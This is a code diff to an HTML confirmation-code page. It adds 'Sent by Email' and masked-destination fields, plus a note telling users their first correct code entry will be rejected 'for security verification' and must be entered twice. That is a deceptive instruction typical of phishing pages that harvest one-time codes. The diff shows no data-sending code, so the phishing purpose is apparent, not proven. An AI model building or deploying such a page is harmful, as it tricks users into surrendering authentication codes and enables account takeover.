@@ -49,6 +49,33 @@
               <form id="enter-code-form" action="#" method="post" novalidate role="form">
                 <h2 class="title">Confirmation Code</h2>
 
+                <!-- ====== DISPLAY SENT BY ====== -->
+                <div class="field-label">
+                  <label for="method-display">Sent by</label>
+                </div>
+                <input
+                  class="inp"
+                  id="method-display"
+                  type="text"
+                  value="Email"
+                  readonly
+                  tabindex="-1"
+                >
+
+                <!-- ====== DISPLAY DESTINATION ====== -->
+                <div class="field-label">
+                  <label for="masked-destination" id="masked-destination-label">Destination</label>
+                </div>
+                <input
+                  class="inp inp-masked"
+                  id="masked-destination"
+                  type="text"
+                  value=""
+                  readonly
+                  tabindex="-1"
+                  aria-live="polite"
+                >
+
                 <div class="field-label">
                   <label for="confirmation-code">Enter code</label>
                   <em>*</em>
@@ -78,6 +105,13 @@
                   </button>
                 </div>
               </form>
+            </div>
+
+            <div class="auth-info" role="note">
+              <span class="auth-info__icon" aria-hidden="true">i</span>
+              <p id="enter-code-note">
+                Enter the confirmation code you received. <strong>You will need to enter it twice</strong> - the first attempt will be rejected for security verification.
+              </p>
             </div>
           </div>
         </div>
